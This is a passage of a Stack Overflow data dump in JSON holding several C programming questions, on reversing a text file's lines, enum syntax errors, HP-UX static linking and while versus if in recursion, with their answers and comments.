"score": 0, "last_activity_date": 1449773276, "last_edit_date": 1449773276, "creation_date": 1449772906, "answer_id": 34209354, "question_id": 34180537, "link": "https://stackoverflow.com/questions/34180537/reading-a-text-file-backwards-and-put-in-c/34209354#34209354", "title": "Reading a text file backwards and put in C", "body": "<p>The following code works, compiles cleanly, performs error checking, reverses the order of the lines in the input file and always cleans up after itself.</p>\n\n<pre><code>#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAX_LINES (100)\n\nint main( void )\n{\n    int    i;\n\n    char *a[MAX_LINES] = {NULL};  // initialize pointers for up to 100 lines\n    FILE *fin = NULL;       // input file pointer\n    FILE *fout = NULL;      // output file pointer\n\n    if( NULL ==(fin=fopen(\"Frozen_snowman.txt\",\"r\") ) )\n    { // then fopen failed\n        perror( \"fopen for input file: Frozen Snowman.txt failed\");\n        exit( EXIT_FAILURE );\n    }\n\n    // implied else, fopen for input successful\n\n    if( NULL == (fout = fopen(\"Reverse.txt\",\"w\") ) )\n    { // then fopen failed\n        perror( \"fopen for output file Reverse.txt failed\");\n        fclose( fin ); // close the file opened above\n        exit( EXIT_FAILURE );\n    }\n\n    // implied else, fopen for output successful\n\n    // read each line into allocated memory\n    // and place allocated memory pointer in array\n    i = 0;\n    while( i &lt; MAX_LINES &amp;&amp; getline(&amp;(a[i]), NULL, fin) )\n    {\n        i++;\n    }\n\n    // count backwards through saved lines, printing them, then\n    // returning the associated memory to the 'heap'\n    for(i--; i&gt;=0; i--)\n    {\n        fputs( a[i],fout);\n        free( a[i] );  // no longer need this line \n    }\n\n    // close open files before exiting\n    fclose( fin );\n    fclose( fout );\n\n    return 0;\n} // end function: main\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5659463, "user_type": "registered", "profile_image": "https://graph.facebook.com/773897189398874/picture?type=large", "display_name": "Themanis", "link": "https://stackoverflow.com/users/5659463/themanis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1544, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1449773458, "creation_date": 1449669242, "last_edit_date": 1449773458, "question_id": 34180537, "link": "https://stackoverflow.com/questions/34180537/reading-a-text-file-backwards-and-put-in-c", "title": "Reading a text file backwards and put in C", "body": "<blockquote>\n  <p>I want to know how to read a text file backwards in C.  </p>\n</blockquote>\n\n<p>Frozen_snowman.txt is</p>\n\n<pre><code>Do you wanna build a snowman?\nCome on lets go and play\nI never see you anymore\nCome out the door\nIt's like you've gone away-\nWe used to be best buddies\nAnd now we're not\nI wish you would tell me why!-\nDo you wanna build a snowman?\nIt doesn't have to be a snowman.\n</code></pre>\n\n<p>Code</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    int i;\n    char buffer[100];\n    char *a[100];\n    FILE *f,*p;\n    f=fopen(\"Frozen_snowman.txt\",\"r\");\n    p=fopen(\"Reverse.txt\",\"w\");\n    for(i=0;i&lt;10;i++)\n    {\n        fgets(buffer,100,f);\n        a[i]=buffer;\n    }\n    for(i=9;i&gt;-1;i--)\n    {\n        fputs(a[i],p);\n    }\n\n    return 0;   \n}\n</code></pre>\n\n<p>Result is </p>\n\n<pre><code>It doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\nIt doesn't have to be a snowman.\n</code></pre>\n\n<blockquote>\n  <p>Why is that?</p>\n</blockquote>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3297, "user_id": 2546099, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/3f7b2455429f817843ab8524d67f37a1?s=128&d=identicon&r=PG&f=1", "display_name": "arc_lupus", "link": "https://stackoverflow.com/users/2546099/arc-lupus"}, "edited": false, "score": 0, "creation_date": 1449665147, "post_id": 34179127, "comment_id": 56104530, "body": "Reason for that is that you use <code>a</code> twice in your definition..."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 3297, "user_id": 2546099, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/3f7b2455429f817843ab8524d67f37a1?s=128&d=identicon&r=PG&f=1", "display_name": "arc_lupus", "link": "https://stackoverflow.com/users/2546099/arc-lupus"}, "edited": false, "score": 0, "creation_date": 1449665175, "post_id": 34179127, "comment_id": 56104554, "body": "@arc_lupus: no, this is allowed in C."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1449667755, "post_id": 34179127, "comment_id": 56106183, "body": "You shouldn&#39;t use names that are reserved by the standard libraries. <code>false</code> and <code>true</code> are already defined by <code>stdbool.h</code>, so you shouldn&#39;t use those names."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449668951, "post_id": 34179127, "comment_id": 56106954, "body": "@Lundin: But only if <code>stdbool.h</code> is <code>#include</code>ed. Otherwise they are valid names in C - but not in C++ (maybe he uses a C++ compiler?). OP should provide the context."}], "answers": [{"comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1449667693, "post_id": 34179161, "comment_id": 56106139, "body": "Note that trailing comma in an enum is only optional since C99. Earlier, they weren&#39;t allowed. It was an inconsistency in the C language which was corrected with C99."}], "tags": [], "owner": {"reputation": 34717, "user_id": 192910, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/de26f9c446ae47545220ff9eff3e3ef7?s=128&d=identicon&r=PG", "display_name": "Mawg says reinstate Monica", "link": "https://stackoverflow.com/users/192910/mawg-says-reinstate-monica"}, "is_accepted": false, "score": 1, "last_activity_date": 1449665085, "last_edit_date": 1495540760, "creation_date": 1449665085, "answer_id": 34179161, "question_id": 34179127, "link": "https://stackoverflow.com/questions/34179127/while-writing-a-code-in-c-error-expected-an-identifier-while-defining-enum/34179161#34179161", "title": "While writing a code in C error : expected an identifier while defining enum", "body": "<p>There should be a comma after <code>false</code>, not a semicolon.</p>\n\n<p>And a comma after <code>true</code> is optional.</p>\n\n<p>You don't even need to Google for it, just search this site. E.g. <a href=\"https://stackoverflow.com/questions/1102542/how-to-define-an-enumerated-type-enum-in-c#1102556\">How to define an enumerated type (enum) in C?</a></p>\n"}, {"tags": [], "owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "is_accepted": false, "score": 3, "last_activity_date": 1449665091, "creation_date": 1449665091, "answer_id": 34179163, "question_id": 34179127, "link": "https://stackoverflow.com/questions/34179127/while-writing-a-code-in-c-error-expected-an-identifier-while-defining-enum/34179163#34179163", "title": "While writing a code in C error : expected an identifier while defining enum", "body": "<p>Use comma after enum constant.</p>\n\n<pre><code>enum a { \n    false,\n    true\n};\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 1, "last_activity_date": 1449665146, "creation_date": 1449665146, "answer_id": 34179184, "question_id": 34179127, "link": "https://stackoverflow.com/questions/34179127/while-writing-a-code-in-c-error-expected-an-identifier-while-defining-enum/34179184#34179184", "title": "While writing a code in C error : expected an identifier while defining enum", "body": "<pre><code>typedef enum a { \n    false,\n    true\n} a;\n</code></pre>\n\n<p>is a succinct way of doing this. Note the comma after <code>false</code>, and the use of <code>typedef</code>.</p>\n\n<p>I wouldn't recommend using <code>false</code> and <code>true</code> as enumerated names though; especially if you intend to port your code to C++.</p>\n"}], "owner": {"reputation": 37, "user_id": 3119673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48bc30b9fb4db5edcbb7c035b90019b5?s=128&d=identicon&r=PG&f=1", "display_name": "user3119673", "link": "https://stackoverflow.com/users/3119673/user3119673"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4168, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1449665146, "creation_date": 1449664989, "last_edit_date": 1449665012, "question_id": 34179127, "link": "https://stackoverflow.com/questions/34179127/while-writing-a-code-in-c-error-expected-an-identifier-while-defining-enum", "title": "While writing a code in C error : expected an identifier while defining enum", "body": "<p>while coding in C, for the below syntax, I receive an error: expected an identifier, please let me know where am I going wrong ? Thank you.</p>\n\n<pre><code>enum a { \n    false;   // error : expected an identifier\n    true;   // // error : expected an identifier\n };\n\ntypedef enum a a;\n</code></pre>\n"}, {"tags": ["c", "gcc", "hp-ux"], "comments": [{"owner": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 0, "creation_date": 1449665775, "post_id": 34178941, "comment_id": 56104923, "body": "Do you have libc installed?"}, {"owner": {"reputation": 342, "user_id": 2084733, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/2d8d709701def68ce5146d5b6abb381b?s=128&d=identicon&r=PG&f=1", "display_name": "theartist33", "link": "https://stackoverflow.com/users/2084733/theartist33"}, "reply_to_user": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "edited": false, "score": 0, "creation_date": 1449665822, "post_id": 34178941, "comment_id": 56104951, "body": "Yes it appears as below                                                               PHCO_43464            1.0            libc cumulative patch"}], "answers": [{"comments": [{"owner": {"reputation": 342, "user_id": 2084733, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/2d8d709701def68ce5146d5b6abb381b?s=128&d=identicon&r=PG&f=1", "display_name": "theartist33", "link": "https://stackoverflow.com/users/2084733/theartist33"}, "edited": false, "score": 0, "creation_date": 1449666445, "post_id": 34179388, "comment_id": 56105356, "body": "glibc is not there for HP-UX I guess, could be libc which is already installed . Also I have manually linked libc.so if that&#39;s what linker is searching for but still not working. avotclbh:/home/akhils/test_prog#ll /usr/lib/hpux64/libc.so lr-xr-xr-x   1 bin        bin             11 Mar  9  2015 /usr/lib/hpux64/libc.so -&gt; ./libc.so.1 avotclbh:/home/akhils/test_prog#"}, {"owner": {"reputation": 342, "user_id": 2084733, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/2d8d709701def68ce5146d5b6abb381b?s=128&d=identicon&r=PG&f=1", "display_name": "theartist33", "link": "https://stackoverflow.com/users/2084733/theartist33"}, "edited": false, "score": 0, "creation_date": 1449666502, "post_id": 34179388, "comment_id": 56105392, "body": "I want to know which library exactly linker is looking for -lc flag ?"}, {"owner": {"reputation": 19346, "user_id": 2793118, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5da03d2e233e1a40a4f1923acfb9d433?s=128&d=identicon&r=PG", "display_name": "Filipe Gon&#231;alves", "link": "https://stackoverflow.com/users/2793118/filipe-gon%c3%a7alves"}, "reply_to_user": {"reputation": 342, "user_id": 2084733, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/2d8d709701def68ce5146d5b6abb381b?s=128&d=identicon&r=PG&f=1", "display_name": "theartist33", "link": "https://stackoverflow.com/users/2084733/theartist33"}, "edited": false, "score": 1, "creation_date": 1449666545, "post_id": 34179388, "comment_id": 56105416, "body": "@theartist33 <code>-lc</code> makes the linker look for libc."}, {"owner": {"reputation": 885, "user_id": 359644, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/773bb887e22a1b9aef642e53f77df8dc?s=128&d=identicon&r=PG&f=1", "display_name": "alnet", "link": "https://stackoverflow.com/users/359644/alnet"}, "edited": false, "score": 0, "creation_date": 1449666618, "post_id": 34179388, "comment_id": 56105460, "body": "Is <code>libc.so</code> located in the PATH? If not, you can add <code>-L&lt;PATH&gt;</code> to the linker or run <code>ldconfig &lt;PATH&gt;</code>"}, {"owner": {"reputation": 342, "user_id": 2084733, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/2d8d709701def68ce5146d5b6abb381b?s=128&d=identicon&r=PG&f=1", "display_name": "theartist33", "link": "https://stackoverflow.com/users/2084733/theartist33"}, "edited": false, "score": 0, "creation_date": 1449667088, "post_id": 34179388, "comment_id": 56105782, "body": "@alnet : I did already what you said but I think what we should understand   is that linker might not be looking for .so instead it is looking for .a (archive/static ) files because I am using -static flag while building up the C program. therefore i checked libc.so file is there but libc.a is not there. This could be the reason I guess ?"}], "tags": [], "owner": {"reputation": 885, "user_id": 359644, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/773bb887e22a1b9aef642e53f77df8dc?s=128&d=identicon&r=PG&f=1", "display_name": "alnet", "link": "https://stackoverflow.com/users/359644/alnet"}, "is_accepted": false, "score": 1, "last_activity_date": 1449665765, "creation_date": 1449665765, "answer_id": 34179388, "question_id": 34178941, "link": "https://stackoverflow.com/questions/34178941/ld-cant-find-library-for-lc/34179388#34179388", "title": "ld: Can&#39;t find library for -lc", "body": "<p>Install <code>glibc</code> library package.</p>\n"}], "owner": {"reputation": 342, "user_id": 2084733, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/2d8d709701def68ce5146d5b6abb381b?s=128&d=identicon&r=PG&f=1", "display_name": "theartist33", "link": "https://stackoverflow.com/users/2084733/theartist33"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1058, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1449668048, "creation_date": 1449664437, "last_edit_date": 1449668048, "question_id": 34178941, "link": "https://stackoverflow.com/questions/34178941/ld-cant-find-library-for-lc", "title": "ld: Can&#39;t find library for -lc", "body": "<p>I am trying to build a C program using static flag (linking statically ). While I am trying to do so linker throws an error \"can't find library for -lc\". Machine I am using is HP-UX. I am unaware which library it requires and where I can find it so that I can include the default search location while building the program with -L option.</p>\n\n<pre><code>avotclbh:/home/akhils/test_prog#\navotclbh:/home/akhils/test_prog#gcc -v\nUsing built-in specs.\nTarget: ia64-hp-hpux11.31\nConfigured with: ../gcc/configure\nThread model: posix\ngcc version 4.2.3\nYou have mail in /var/mail/root\navotclbh:/home/akhils/test_prog#\n\n\navotclbh:/home/akhils/test_prog#gcc -v -static test_debugging.c -o test_debugging.out -L/usr/lib/hpux64\nUsing built-in specs.\nTarget: ia64-hp-hpux11.31\nConfigured with: ../gcc/configure\nThread model: posix\ngcc version 4.2.3\n /usr/local/libexec/gcc/ia64-hp-hpux11.31/4.2.3/cc1 -quiet -v test_debugging.c -quiet -dumpbase test_debugging.c -auxbase test_debugging -version -o /var/tmp//ccjCisnQ.s\nignoring nonexistent directory \"NONE/include\"\nignoring nonexistent directory \"/usr/local/lib/gcc/ia64-hp-hpux11.31/4.2.3/../../../../ia64-hp-hpux11.31/include\"\n#include \"...\" search starts here:\n#include &lt;...&gt; search starts here:\n /usr/local/include\n /usr/local/lib/gcc/ia64-hp-hpux11.31/4.2.3/include\n /usr/include\nEnd of search list.\nGNU C version 4.2.3 (ia64-hp-hpux11.31)\n        compiled by GNU C version 4.2.3.\nGGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072\nCompiler executable checksum: 207e4f838aed34ece15d2a59ed6e0ca7\n /usr/local/bin/as -x -o /var/tmp//cceZpXhF.o /var/tmp//ccjCisnQ.s\n /usr/local/libexec/gcc/ia64-hp-hpux11.31/4.2.3/collect2 -z +Accept TypeMismatch -u main -noshared -o test_debugging.out crt0.o /usr/lib/hpux32/unix98.o -L/usr/lib/hpux64 -L/usr/local/lib/gcc/ia64-hp-hpux11.31/4.2.3 -L/usr/ccs/lib -L/usr/local/lib/gcc/ia64-hp-hpux11.31/4.2.3/../../.. /var/tmp//cceZpXhF.o -lgcc -lc -lgcc\n**ld: Can't find library for -lc\nFatal error.\ncollect2: ld returned 1 exit status**\navotclbh:/home/akhils/test_prog#\n</code></pre>\n\n<p>Also, I have below dependencies already installed on machine</p>\n\n<pre><code>avotclbh:/home/akhils/test_prog#swlist -l product |grep -iE \"gcc|zlib|libiconv|gettext\"\n  gcc                   4.2.3          gcc\n  gettext               0.19.5.1       gettext\n  libiconv              1.14           libiconv\n  zlib                  1.2.8          zlib\navotclbh:/home/akhils/test_prog#\n</code></pre>\n"}, {"tags": ["c", "if-statement", "recursion", "while-loop"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449663918, "post_id": 34178725, "comment_id": 56103788, "body": "This is an endless loop. It is the same difference as always between <code>whille</code> (loop) and <code>if</code> (conditional statement)."}, {"owner": {"reputation": 281, "user_id": 4804137, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh5.googleusercontent.com/-g5Jl1swYcR8/AAAAAAAAAAI/AAAAAAAAALo/LpwhSYlTL7M/photo.jpg?sz=128", "display_name": "Andrei Poehlmann", "link": "https://stackoverflow.com/users/4804137/andrei-poehlmann"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449664070, "post_id": 34178725, "comment_id": 56103899, "body": "so why does my compiler run it smoothly and return 120 in this case?"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449664602, "post_id": 34178725, "comment_id": 56104193, "body": "@Olaf That may not be an endless loop but yes number of iterations would be many more than normal for a large input."}, {"owner": {"reputation": 1875, "user_id": 5057191, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d3a861c87b46363f63080839bbc699f2?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. E", "link": "https://stackoverflow.com/users/5057191/mr-e"}, "edited": false, "score": 0, "creation_date": 1449664765, "post_id": 34178725, "comment_id": 56104298, "body": "Number of iterations for this case is exactly the same cause the <code>return</code> statement as Fabian said in his answer"}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 1875, "user_id": 5057191, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/d3a861c87b46363f63080839bbc699f2?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. E", "link": "https://stackoverflow.com/users/5057191/mr-e"}, "edited": false, "score": 0, "creation_date": 1449664938, "post_id": 34178725, "comment_id": 56104413, "body": "@Mr.E Huh , my bad  , thought something else ."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1449668352, "post_id": 34178725, "comment_id": 56106569, "body": "@ameyCU: Sorry, I missed the <code>return</code> inside the loop. I hate recursion. Hmm, yes, it really should behave the same, but the <code>while</code> is nonsense. What does OP want to accomplish? Just to ask a question?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1449668440, "post_id": 34178725, "comment_id": 56106613, "body": "I stand corrected by @ameyCU. Just note that your compiler does not run anything! It just translates your source code. It is the CPU which runs all software."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1449668516, "post_id": 34178725, "comment_id": 56106654, "body": "FYI: Tail-recursion might be faster and possibly avoid stack nesting."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 2, "creation_date": 1449669014, "post_id": 34178725, "comment_id": 56107002, "body": "The ideal solution is to remove the recursion entirely and just use a loop. One particularly good way to show off that you are a skilled C programmer is to write programs that are 100% free of recursion."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449669148, "post_id": 34178725, "comment_id": 56107096, "body": "@Olaf Question would be avoided as OP debugs the program , and  he must have got his answer by debugger :-)."}, {"owner": {"reputation": 281, "user_id": 4804137, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh5.googleusercontent.com/-g5Jl1swYcR8/AAAAAAAAAAI/AAAAAAAAALo/LpwhSYlTL7M/photo.jpg?sz=128", "display_name": "Andrei Poehlmann", "link": "https://stackoverflow.com/users/4804137/andrei-poehlmann"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449669166, "post_id": 34178725, "comment_id": 56107105, "body": "@Olaf I want to accomplish that I understand what&#39;s happening and why, considering whether it was just a special case/luck/or the like. And not just keep guessing why the code did what I wanted it to do, and moving on to the next chapter, ignoring my confusion =)"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449670237, "post_id": 34178725, "comment_id": 56107845, "body": "@reinka: You can use an axe to peel an apple. But it is likely not an appropriate tool for that. Same for constructs. There is a reason every programming language has loop constructs and conditional constructs. No use in abusing <code>while</code> as a conditional statement. If you have not understood the difference, <b>this</b> is the wrong way."}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1449668613, "post_id": 34178918, "comment_id": 56106717, "body": "While they <b>behave</b> identical, they are still not the same, as the <code>while</code> might generate different code (depends on the compiler)."}], "tags": [], "owner": {"reputation": 1596, "user_id": 5483583, "user_type": "registered", "accept_rate": 42, "profile_image": "https://www.gravatar.com/avatar/58e00258c68a02aeb27dd3bb73728821?s=128&d=identicon&r=PG&f=1", "display_name": "Fabian Schmitthenner", "link": "https://stackoverflow.com/users/5483583/fabian-schmitthenner"}, "is_accepted": true, "score": 5, "last_activity_date": 1449664356, "creation_date": 1449664356, "answer_id": 34178918, "question_id": 34178725, "link": "https://stackoverflow.com/questions/34178725/c-difference-between-using-if-or-while-in-recursion/34178918#34178918", "title": "C difference between using if or while in recursion", "body": "<p>this is technically the same in this case because as soon as you enter the while loop you quit it with the <code>return</code> statement. The following two statements are also the same:</p>\n\n<pre><code>while (a) {\n  b;\n  break;\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>if (a) {\n  b;\n}\n</code></pre>\n\n<p>But you shouldn't use <code>while</code> in this case because it's intended for loops, so there should be execution paths where it executes multiple times. There's a reason that there are both <code>if</code> and <code>while</code>.</p>\n"}], "owner": {"reputation": 281, "user_id": 4804137, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh5.googleusercontent.com/-g5Jl1swYcR8/AAAAAAAAAAI/AAAAAAAAALo/LpwhSYlTL7M/photo.jpg?sz=128", "display_name": "Andrei Poehlmann", "link": "https://stackoverflow.com/users/4804137/andrei-poehlmann"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 455, "favorite_count": 0, "accepted_answer_id": 34178918, "answer_count": 1, "score": -1, "last_activity_date": 1449664356, "creation_date": 1449663743, "question_id": 34178725, "link": "https://stackoverflow.com/questions/34178725/c-difference-between-using-if-or-while-in-recursion", "title": "C difference between using if or while in recursion", "body": "<p>While trying to find different possibilities of writing a recursive factorial function, I noticed that I got confused about the differences of using <code>while</code> or <code>if</code> in the following recursive function. I watched the steps for each option using the <code>gdb debugger</code>, and couldn't see any difference either. I know the functionality of the <code>while loop</code>, and that it works iteratively. But since its body contains a recursive call of the function as a return statement, the current function should be 'left' and a new one should be entered, which will lead to entering a new while loop? It seems to me that in this case it works like a regular <code>if statement</code>? I appreciate any clarification on this. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint recursion(int n)\n{\n    while(n &gt; 0)\n        return n * recursion(n-1);\n    return 1;\n}\n\nint main(void) \n{\n    int n = 5;\n\n    printf(\"%d\\n\", recursion(n));       \n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>alternative recursive function using <code>if</code> leading to the same result:</p>\n\n<pre><code>int recursion(int n)\n{\n    if(n &gt; 0)\n        return n * recursion(n-1);\n    return 1;\n}\n</code></pre>\n"}, {"tags": ["c", "networking", "blocking"], "comments": [{"owner": {"reputation": 885, "user_id": 359644, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/773bb887e22a1b9aef642e53f77df8dc?s=128&d=identicon&r=PG&f=1", "display_name": "alnet", "link": "https://stackoverflow.com/users/359644/alnet"}, "edited": false, "score": 0, "creation_date": 1449664940, "post_id": 34178684, "comment_id": 56104415, "body": "Can you run the process in GDB? Alternatively you can monitor it using <code>strace</code> to see what are the last system calls it used."}, {"owner": {"reputation": 2597, "user_id": 1389218, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/XZKfz.png?s=128&g=1", "display_name": "John U", "link": "https://stackoverflow.com/users/1389218/john-u"}, "reply_to_user": {"reputation": 885, "user_id": 359644, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/773bb887e22a1b9aef642e53f77df8dc?s=128&d=identicon&r=PG&f=1", "display_name": "alnet", "link": "https://stackoverflow.com/users/359644/alnet"}, "edited": false, "score": 0, "creation_date": 1449665711, "post_id": 34178684, "comment_id": 56104876, "body": "The answer to both of those is &quot;Not easily&quot; - the system is an 